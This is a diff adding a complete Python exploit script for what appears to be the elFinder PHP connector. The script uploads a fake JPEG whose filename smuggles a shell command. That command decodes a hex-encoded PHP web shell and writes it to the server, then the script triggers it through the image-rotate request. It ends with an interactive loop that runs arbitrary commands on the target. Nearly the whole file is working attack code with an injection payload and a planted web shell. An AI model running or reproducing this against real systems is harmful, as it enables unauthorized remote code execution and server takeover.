@@ -1,1 +1,139 @@
+#!/usr/bin/env python3
+import requests
+import json
+import sys
+import urllib.parse
+from http import client as httplib
 
+# Hex encoded <?php system($_GET["c"]); ?>
+PAYLOAD = ('SecSignal.jpg;echo 3c3f7068702073797374656d28245f4745545b2263225d293b203f3e0a | '
+           'xxd -r -p > SecSignal.php;echo SecSignal.jpg')
+
+def usage():
+    if len(sys.argv) != 2:
+        print(f"Usage: {sys.argv[0]} http://target.com")
+        sys.exit(1)
+
+def upload(target_url):
+    """Upload malicious image file with payload"""
+    try:
+        files = {
+            'upload[]': (
+                PAYLOAD,
+                b'\xff\xd8\xff\xe0\x00\x10JFIF\x00',  # Minimal JPEG header
+                'image/jpeg'
+            )
+        }
+        
+        data = {
+            "reqid": "1693222c439f4",
+            "cmd": "upload",
+            "target": "l1_Lw",  # Try "l1_L2" or "l1_" if this fails
+            "mtime[]": "1497726174"
+        }
+
+        response = requests.post(
+            f"{target_url}/php/connector.minimal.php",
+            files=files,
+            data=data,
+            timeout=15,
+            headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
+        )
+
+        response.raise_for_status()
+        json_data = response.json()
+        
+        if 'added' not in json_data or not json_data['added']:
+            print("[-] Upload failed - invalid server response")
+            sys.exit(1)
+            
+        return json_data['added'][0]['hash']
+
+    except json.JSONDecodeError:
+        print("[-] Server response not JSON - check URL path or auth requirements")
+        sys.exit(1)
+    except Exception as e:
+        print(f"[-] Upload failed: {str(e)}")
+        sys.exit(1)
+
+def trigger_exploit(target_url, file_hash):
+    """Trigger the command injection through image rotation"""
+    try:
+        encoded_hash = urllib.parse.quote(file_hash)
+        url = (f"{target_url}/php/connector.minimal.php?"
+               f"target={encoded_hash}&width=539&height=960&degree=180&"
+               "quality=100&bg=&mode=rotate&cmd=resize&reqid=169323550af10c")
+        
+        response = requests.get(
+            url,
+            timeout=15,
+            headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
+        )
+        return response.status_code == 200
+    except Exception as e:
+        print(f"[-] Payload trigger failed: {str(e)}")
+        return False
+
+def interactive_shell(target_url):
+    """Provide interactive command execution"""
+    try:
+        test = requests.get(f"{target_url}/php/SecSignal.php", timeout=10)
+        if test.status_code != 200:
+            print("[-] Exploit failed - shell not found")
+            return
+
+        print("[+] Successful shell access!")
+        print("[!] Type 'exit' to quit\n")
+        
+        while True:
+            try:
+                cmd = input("$ ").strip()
+                if not cmd:
+                    continue
+                if cmd.lower() == 'exit':
+                    break
+                
+                encoded_cmd = urllib.parse.quote(cmd)
+                response = requests.get(
+                    f"{target_url}/php/SecSignal.php?c={encoded_cmd}",
+                    timeout=15
+                )
+                print(response.text)
+                
+            except KeyboardInterrupt:
+                print("\n[!] Exiting...")
+                break
+                
+    except Exception as e:
+        print(f"[-] Shell error: {str(e)}")
+
+def main():
+    usage()
+    target = sys.argv[1].rstrip('/')
+    
+    # Verify base URL connectivity
+    try:
+        requests.get(target, timeout=10)
+    except (requests.ConnectionError, requests.Timeout):
+        print(f"[-] Could not connect to {target}")
+        sys.exit(1)
+        
+    print("[*] Attempting exploit against:", target)
+    
+    try:
+        print("[*] Uploading malicious image...")
+        file_hash = upload(target)
+        
+        print("[*] Triggering payload execution...")
+        if trigger_exploit(target, file_hash):
+            print("[+] Payload triggered successfully!")
+            interactive_shell(target)
+        else:
+            print("[-] Failed to trigger payload")
+    except httplib.HTTPException as e:
+        print(f"[-] HTTP protocol error: {str(e)}")
+    except KeyboardInterrupt:
+        print("\n[!] Exploit aborted by user")
+
+if __name__ == "__main__":
+    main()
